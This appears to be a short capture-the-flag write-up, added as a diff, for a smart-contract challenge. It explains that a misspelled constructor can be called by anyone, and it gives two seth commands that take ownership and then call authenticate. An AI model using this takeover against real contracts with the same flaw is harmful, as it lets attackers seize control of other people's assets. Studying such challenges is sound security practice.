@@ -1,0 +1,8 @@
+The constructor function has a typo so it's not actually a constructor
+This means that it can be called any time, not only when the contract is being deployed
+
+> seth send 0x3335d7aC2B7fa527d9368A3050eA574c57d287c0 "AssumeOwmershipChallenge()"
+
+And then I call the `authenticate` function
+
+> seth send 0x3335d7aC2B7fa527d9368A3050eA574c57d287c0 "authenticate()"
